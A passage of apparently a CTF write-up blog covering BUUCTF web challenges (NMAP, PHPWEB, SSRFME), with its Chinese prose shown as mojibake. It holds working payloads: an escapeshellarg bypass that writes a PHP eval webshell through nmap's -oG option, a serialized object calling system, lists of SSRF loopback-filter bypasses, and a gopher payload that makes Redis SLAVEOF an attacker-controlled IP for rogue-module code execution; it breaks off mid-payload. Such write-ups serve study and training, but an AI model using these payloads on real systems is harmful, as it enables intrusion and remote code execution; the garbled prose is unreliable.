class="hljs-number">8080</span>)<br></code></pre></div></td></tr></table></figure><p>åªè¿‡æ»¤äº†urlå‚æ•°å¼€å¤´ä¸èƒ½ç”¨fileåè®®ï¼Œæ€ªä¸å¾—æœ‰éé¢„æœŸã€‚åœ¨åé¢å¯ä»¥çœ‹åˆ°<code>no_one_know_the_manager</code>ä¸­è¦åŒ¹é…SECRET_KEYï¼Œç„¶åæ‰§è¡Œshellï¼Œä½†æ˜¯SECRET_KEYæ‰€åœ¨çš„secret.txtè¢«åˆ æ‰äº†ï¼Œè¿™é‡Œå°±ç”¨åˆ°äº†<code>/proc/pid/fd/</code>è¯»å–ï¼Œè¿™ä¸ªç›®å½•åŒ…å«äº†è¿›ç¨‹æ‰“å¼€çš„æ¯ä¸€ä¸ªæ–‡ä»¶çš„é“¾æ¥ã€‚çˆ†ç ´å‡ºsecretåœ¨<code>/proc/pid/fd/3</code></p><p><img src="https://img-blog.csdnimg.cn/ea025726ab7b4d11aca95c2a4de1edc2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>éšåç”¨shellå‚æ•°åå¼¹shellå°±è¡Œäº†ã€‚</p><h1 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h1><p>å‚è€ƒæ–‡ç« ï¼š<a href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/">http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p><p><strong>escapeshellcmd</strong> â€” shell å…ƒå­—ç¬¦è½¬ä¹‰</p><p>åŠŸèƒ½ï¼š<code>escapeshellcmd()</code>å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ° <a href="http://php.net/manual/zh/function.exec.php">exec()</a> æˆ– <a href="http://php.net/manual/zh/function.system.php">system()</a> å‡½æ•°ï¼Œæˆ–è€… <a href="http://php.net/manual/zh/language.operators.execution.php">æ‰§è¡Œæ“ä½œç¬¦</a> ä¹‹å‰è¿›è¡Œè½¬ä¹‰ã€‚</p><p>åæ–œçº¿ï¼ˆ\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š <code>&amp;#;|\*?~&lt;&gt;^()[]&#123;&#125;$, \x0Aå’Œ \xFF</code>ã€‚ *â€™* å’Œ <em>â€œ</em> ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚ åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ <em>%</em> å’Œ <em>!</em> å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚</p><p><strong>å®šä¹‰</strong> ï¼š<code>string escapeshellcmd ( string $command)</code></p><p><strong>escapeshellarg</strong> â€” æŠŠå­—ç¬¦ä¸²è½¬ç ä¸ºå¯ä»¥åœ¨ shell å‘½ä»¤é‡Œä½¿ç”¨çš„å‚æ•°</p><p><strong>åŠŸèƒ½</strong> ï¼š<code>escapeshellarg()</code> å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œshell å‡½æ•°åŒ…å« exec(), system() æ‰§è¡Œè¿ç®—ç¬¦(åå¼•å·)</p><p><strong>å®šä¹‰</strong> ï¼š<code>string escapeshellarg ( string $arg )</code></p><h3 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><p>è€ƒå¯Ÿå‘½ä»¤æ‰§è¡Œï¼Œå’Œ<code>escapeshellarg</code>çš„ç»•è¿‡</p><p>æ‰“å¼€ç•Œé¢ï¼Œå‘ç°æ˜¯nmapï¼Œè¯•ä¸€ä¸‹127.0.0.1æ­£å¸¸è¾“å‡ºæ‰«æç»“æœï¼Œè¿™è‚¯å®šæ˜¯å‘½ä»¤æ‰§è¡Œï¼Œè¯•ä¸€ä¸‹<code>127.0.0.1| ls</code>,å‘ç°è½¬ä¹‰äº†|ã€‚</p><p><img src="https://img-blog.csdnimg.cn/0f98865e7a5849d8b9ae690eadcf69bf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å‚è€ƒä¸Šé¢çš„æ–‡ç« ç»•è¿‡è½¬ä¹‰ï¼Œè¿™é‡Œæœ‰å¾ˆå¤špayloadï¼Œæ³¨æ„phpä¹Ÿè¢«è¿‡æ»¤äº†</p><p><code>&#39; &lt;?= @eval($_POST[&#39;cmd&#39;];)&gt; -oG pd.phtml &#39;</code></p><p><code>127.0.0.1&#39; -iL ../../../../flag -o 1</code></p><p>åœ¨çº¿æµ‹è¯•äº†ä¸€ä¸‹ï¼Œæ²¡é—®é¢˜</p><p><img src="https://img-blog.csdnimg.cn/56869b7313ac41da871dcdf5a862d9ab.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¯ä»¥çœ‹ä¸€ä¸‹æºç </p><p><img src="https://img-blog.csdnimg.cn/6f87e72fdd024af786d6e90606fd4eb7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¯»flag</p><p><img src="https://img-blog.csdnimg.cn/8a52b789d1d74244ae930f7970c68d30.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">****</p><h1 id="PHPWEB"><a href="#PHPWEB" class="headerlink" title="PHPWEB"></a>PHPWEB</h1><p>æŠ“åŒ…å‘ç°æœ‰ä¸¤ä¸ªå‚æ•°funcå’Œp,åˆæç¤ºæœ‰funcæœ€å¼€å§‹ä¸ºdateå‡½æ•°ï¼ŒçŒœæµ‹è¿™é‡Œå¯ä»¥æ‰§è¡Œå‡½æ•°å‘½ä»¤ï¼Œè¯•äº†ä¸€ä¸‹systemç­‰å‘ç°è¢«è¿‡æ»¤ï¼Œæœ€åå°è¯•äº†åŠå¤©è¯•äº†ä¸‹<code>func=readfile&amp;p=./index.php</code>ï¼Œè¯»åˆ°äº†æºç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);<br> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>) </span>&#123;<br>     <span class="hljs-variable">$result</span> = call_user_func(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>     <span class="hljs-variable">$a</span>= gettype(<span class="hljs-variable">$result</span>);<br>     <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>     &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;&#125;<br> &#125;<br> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>     <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>     <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>         <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>             <span class="hljs-keyword">echo</span> gettime(<span class="hljs-keyword">$this</span>-&gt;func, <span class="hljs-keyword">$this</span>-&gt;p);<br>         &#125;<br>     &#125;<br> &#125;<br> <span class="hljs-variable">$func</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;func&quot;</span>];<br> <span class="hljs-variable">$p</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;p&quot;</span>];<br><br> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> != <span class="hljs-literal">null</span>) &#123;<br>     <span class="hljs-variable">$func</span> = strtolower(<span class="hljs-variable">$func</span>);<br>     <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$disable_fun</span>)) &#123;<br>         <span class="hljs-keyword">echo</span> gettime(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>     &#125;<span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);<br>     &#125;<br> &#125;<br> <span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>å®¡è®¡ä¸€ä¸‹å‘ç°è€ƒçš„è¿˜æ˜¯ååºåˆ—åŒ–ï¼Œç›´æ¥expï¼š</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span>;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>) </span>&#123;<br><span class="hljs-comment"># code...</span><br><span class="hljs-keyword">$this</span>-&gt;p = <span class="hljs-variable">$p</span>;<br><span class="hljs-keyword">$this</span>-&gt;func = <span class="hljs-variable">$func</span>;<br>&#125;<br>&#125;<br><span class="hljs-variable">$demo</span> = <span class="hljs-keyword">new</span> Test(<span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;ls /&quot;</span>);<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$demo</span>);<br><br></code></pre></div></td></tr></table></figure><p>æœ€åå°è¯•äº†flagåœ¨<code>/tmp/flagoefiu4r93</code></p><p><img src="https://img-blog.csdnimg.cn/c6551e040d3847e9b4a28b7527292673.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="SSRFME"><a href="#SSRFME" class="headerlink" title="SSRFME"></a>SSRFME</h1><p>å‚è€ƒæ–‡ç« </p><p><a href="https://zhuanlan.zhihu.com/p/147371417">https://zhuanlan.zhihu.com/p/147371417</a></p><p><a href="https://blog.csdn.net/gqtcgq/article/details/50273431">https://blog.csdn.net/gqtcgq/article/details/50273431</a></p><p><a href="https://xz.aliyun.com/t/5665#toc-0">https://xz.aliyun.com/t/5665#toc-0</a></p><p><a href="https://xz.aliyun.com/t/8163#toc-7">https://xz.aliyun.com/t/8163#toc-7</a></p><p><a href="https://xz.aliyun.com/t/5616">https://xz.aliyun.com/t/5616</a></p><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>å°è¯•å»ºç«‹ä¸»ä»è¿æ¥è¿‡ç¨‹ï¼Œé¦–å…ˆåœ¨é…ç½®ä¸­ä¿®æ”¹</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">protected-mode è®¾ç½®ä¸º<span class="hljs-literal">no</span>    å…è®¸å¤–éƒ¨ipè®¿é—®<br>æ‰¾åˆ°bind 127.0.0.1 æ³¨é‡Šæ‰ï¼Œè¿™ä¸ªæ˜¯redisæœåŠ¡ç»‘å®šå¯è®¿é—®çš„ipï¼Œ æ‰€ä»¥127.0.0.1ä¹‹å¤–çš„æœºå™¨éƒ½è®¿é—®ä¸äº†æ­¤redisæœåŠ¡<br>firewall-cmd <span class="hljs-attribute">--zone</span>=public <span class="hljs-attribute">--add-port</span>=6379/tcp --permanent   å¼€æ”¾ç«¯å£<br>æ³¨æ„åœ¨æœåŠ¡å™¨é˜²ç«å¢™ä¸Šä¹Ÿå¾—å¼€æ”¾ç«¯å£<br>daemonize è®¾ç½®ä¸º<span class="hljs-literal">yes</span><br><br>ç„¶åå¯åŠ¨redis-server å³å¯é»˜è®¤6379ç«¯å£ä¹Ÿå¯è®¾ç½®ä¸ºå…¶ä»–ç«¯å£<br></code></pre></div></td></tr></table></figure><p>ä»æœåŠ¡å™¨ä¼šä»æœåŠ¡å™¨åŒæ­¥æ•°æ®</p><p><img src="https://img-blog.csdnimg.cn/7ecc41366a34439392b9ce7f96f85983.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å†™å…¥æ–‡ä»¶</p><p><img src="https://img-blog.csdnimg.cn/a00e1cf3116445a7a41ac672f71cf406.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åŸç†</p><ul><li><code>slaveof</code>ï¼ˆæ–°ç‰ˆæ”¹ä¸º<code>REPLICAOF</code>ï¼‰å»ºç«‹åslaveä¼šå‘masterå‘é€<code>PSYNC</code>ï¼Œè¯·æ±‚å¼€å§‹å¤åˆ¶</li><li>masterå¯ä»¥è¿”å›<code>FULLRESYNC</code>ï¼Œè¿›è¡Œå…¨é‡å¤åˆ¶ï¼Œç„¶åå°†è‡ªå·±æŒä¹…åŒ–çš„æ•°æ®å‘ç»™slaveï¼Œæ­£å¸¸æƒ…å†µä¸‹åŒ…æ‹¬<code>Replication ID</code>, <code>offset</code>ï¼Œmasterå­˜å‚¨çš„key-valueç­‰ç­‰</li><li>slaveä¼šå°†è¿™äº›æ•°æ®ä¿å­˜åˆ°configä¸­<code>dbfilename</code>æŒ‡å®šçš„æ–‡ä»¶ï¼ˆé»˜è®¤ä¸ºdump.rdbï¼‰ï¼Œç„¶åå†è½½å…¥ã€‚</li><li>é€šè¿‡ä¼ªé€ masterï¼Œå¯ä»¥æ§åˆ¶å‘å¾€slaveçš„ä¿¡æ¯ï¼Œä»è€Œåšåˆ°æ— è„æ•°æ®å†™æ–‡ä»¶</li><li>åœ¨Reids 4.xä¹‹åï¼ŒRedisæ–°å¢äº†æ¨¡å—åŠŸèƒ½ï¼Œé€šè¿‡å¤–éƒ¨æ‹“å±•ï¼Œå¯ä»¥å®ç°åœ¨redisä¸­å®ç°ä¸€ä¸ªæ–°çš„Rediså‘½ä»¤ï¼Œé€šè¿‡å†™cè¯­è¨€å¹¶ç¼–è¯‘å‡º.soæ–‡ä»¶</li><li>å› æ­¤é€šè¿‡FULLRESYNCå†™å…¥æ¶æ„soæ–‡ä»¶ï¼Œç„¶å<code>MODULE LOAD /path/to/mymodule.so</code>è½½å…¥æ¨¡å—å³å¯rce</li></ul><h3 id="é¢˜è§£-1"><a href="#é¢˜è§£-1" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><p>ç¬¬ä¸€å…³ç»•è¿‡</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">parse_urlä¸libcurlå¯¹urlçš„è§£æå·®å¼‚ç»•è¿‡check_inner_ipå‡½æ•°å¯¹å†…ç½‘åœ°å€çš„åˆ¤æ–­<br>http:<span class="hljs-regexp">//u</span>:p@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">80</span>@baidu.com/hint.php<br>è¿˜å¯ä»¥ç”¨<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>è¡¨ç¤ºipv4ä¸‹æ‰€æœ‰ipåœ°å€<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>/hint.php<br>http:<span class="hljs-regexp">//</span>[<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:ffff:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>]<span class="hljs-regexp">//</span>hint.php<br>ä¹Ÿå¯ä»¥DNS Rebindingã€‚è®©åŸŸååœ¨check_inner_ipçš„æ—¶å€™ä¸ºå¤–éƒ¨åœ°å€ï¼Œè€Œcurlè¯·æ±‚çš„æ—¶å€™åˆå˜æˆå†…éƒ¨IPã€‚<br>https:<span class="hljs-regexp">//</span>lock.cmpxchg8b.com/rebinder.html<br></code></pre></div></td></tr></table></figure><p>ç½‘ä¸Šä¹Ÿçœ‹åˆ°å¾ˆå¤šç»•è¿‡æŠ€å·§</p><p>åˆ©ç”¨URLçš„è§£æé—®é¢˜,</p><p>åˆ©ç”¨ä¸å­˜åœ¨çš„åè®®å¤´ç»•è¿‡æŒ‡å®šçš„åè®®</p><p>å…¶ä»–å„ç§æŒ‡å‘127.0.0.1çš„åœ°å€</p><p>è¿›åˆ¶çš„è½¬æ¢ç»•è¿‡å†…ç½‘IP</p><p>åˆ©ç”¨302è·³è½¬ç»•è¿‡å†…ç½‘IP</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost/         # localhostå°±æ˜¯ä»£æŒ‡<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">http</span>://<span class="hljs-number">0</span>/                 # <span class="hljs-number">0</span>åœ¨windowä¸‹ä»£è¡¨<span class="hljs-number">0.0.0.0</span>ï¼Œè€Œåœ¨liunxä¸‹ä»£è¡¨<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">http</span>://<span class="hljs-number">0.0.0.0</span>/       # <span class="hljs-number">0.0.0.0</span>è¿™ä¸ªIPåœ°å€è¡¨ç¤ºæ•´ä¸ªç½‘ç»œï¼Œå¯ä»¥ä»£è¡¨æœ¬æœº ipv<span class="hljs-number">4</span> çš„æ‰€æœ‰åœ°å€<br><span class="hljs-attribute">http</span>://[<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:ffff:<span class="hljs-number">127.0.0.1</span>]/    # åœ¨liunxä¸‹å¯ç”¨ï¼Œwindowæµ‹è¯•äº†ä¸‹ä¸è¡Œ<br><span class="hljs-attribute">http</span>://[::]:<span class="hljs-number">80</span>/           # åœ¨liunxä¸‹å¯ç”¨ï¼Œwindowæµ‹è¯•äº†ä¸‹ä¸è¡Œ<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127</span>ã€‚<span class="hljs-number">0</span>ã€‚<span class="hljs-number">0</span>ã€‚<span class="hljs-number">1</span>/       # ç”¨ä¸­æ–‡å¥å·ç»•è¿‡<br><span class="hljs-attribute">http</span>://â‘ â‘¡â‘¦.â“ª.â“ª.â‘ <br><span class="hljs-attribute">http</span>://<span class="hljs-number">127</span>.<span class="hljs-number">1</span>/<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127</span>.<span class="hljs-number">00000</span>.<span class="hljs-number">00000</span>.<span class="hljs-number">001</span>/ # <span class="hljs-number">0</span>çš„æ•°é‡å¤šä¸€ç‚¹å°‘ä¸€ç‚¹éƒ½æ²¡å½±å“ï¼Œæœ€åè¿˜æ˜¯ä¼šæŒ‡å‘<span class="hljs-number">127.0.0.1</span><br></code></pre></div></td></tr></table></figure><p>ä¸‹ä¸€å±‚æºç ï¼Œè¿™é‡Œå¯ä»¥å‚è€ƒä¸Šé¢çš„æ–‡ç« ï¼Œä½†è€ƒç‚¹ä¸åœ¨è¿™ï¼Œå‡ ä¸ªpayloadæ‰“ä¸é€šã€‚è¿™é‡Œå¯ä»¥çœ‹åˆ°æœ‰rediså¯†ç ï¼Œåº”è¯¥æ˜¯ssrfæ‰“redisã€‚</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">string</span>(<span class="hljs-number">1342</span>) <span class="hljs-string">&quot; &lt;?php</span><br><span class="hljs-string">if(<span class="hljs-subst">$_SERVER</span>[&#x27;REMOTE_ADDR&#x27;]===&quot;</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-string">&quot;)&#123;</span><br><span class="hljs-string">  highlight_file(__FILE__);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">if(isset(<span class="hljs-subst">$_POST</span>[&#x27;file&#x27;]))&#123;</span><br><span class="hljs-string">  file_put_contents(<span class="hljs-subst">$_POST</span>[&#x27;file&#x27;],&quot;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;redispass is root&#x27;</span>;<span class="hljs-keyword">exit</span>();<span class="hljs-string">&quot;.<span class="hljs-subst">$_POST</span>[&#x27;file&#x27;]);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&quot;</span><br></code></pre></div></td></tr></table></figure><p>è€ƒç‚¹æœ€åæ˜¯redisä¸»ä»å¤åˆ¶æ¥getshellï¼Œä¸¤ä¸ªè‡ªåŠ¨åŒ–è„šæœ¬</p><p><a href="https://github.com/xmsec/redis-ssrf">https://github.com/xmsec/redis-ssrf</a></p><p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><p>ç¬¬äºŒä¸ªé¡¹ç›®ä¸­æ‰“ssrfçš„éœ€è¦æ ¹æ®æœåŠ¡å™¨æ”¹ä¸€ä¸‹ipï¼Œrceå‘½ä»¤ä¹Ÿå¯ä»¥æ”¹ï¼Œç”±äºéœ€è¦ç»•è¿‡ç¬¬ä¸€å±‚gopherè®¿é—®çš„ipä¹Ÿè¦æ”¹æˆ0.0.0.0.å¹¶ä¸”å°†ç¬¬ä¸€ä¸ªé¡¹ç›®çš„exp.soä¸Šä¼ åˆ°åŒç›®å½•ã€‚buuå°å·å¼€ä¸€ä¸ªæœåŠ¡å™¨ï¼Œä¸‹è½½ä¸¤ä¸ªé¡¹ç›®ï¼Œç”Ÿæˆpayloadï¼Œè§£ç çœ‹ä¸€ä¸‹,æ‰‹åŠ¨æ‰“ä¹Ÿå·®ä¸å¤šæŒ‰è¿™ä¸ªã€‚</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">gopher:<span class="hljs-comment">//0.0.0.0:6379/_*2</span><br>$<span class="hljs-number">4</span><br>AUTH<br>$<span class="hljs-number">4</span><br>root   <span class="hljs-comment">//è¿™é‡Œå…ˆè®¤è¯</span><br>*<span class="hljs-number">3</span><br>$<span class="hljs-number">7</span><br>SLAVEOF<br>$<span class="hljs-number">14</span><br><span class="hljs-number">172.16</span>.<span class="hljs-number">152.217</span>   <span class="hljs-comment">//å°†æœåŠ¡å™¨è®¾ç½®ä¸ºä¸»æœåŠ¡å™¨</span><br>$<span 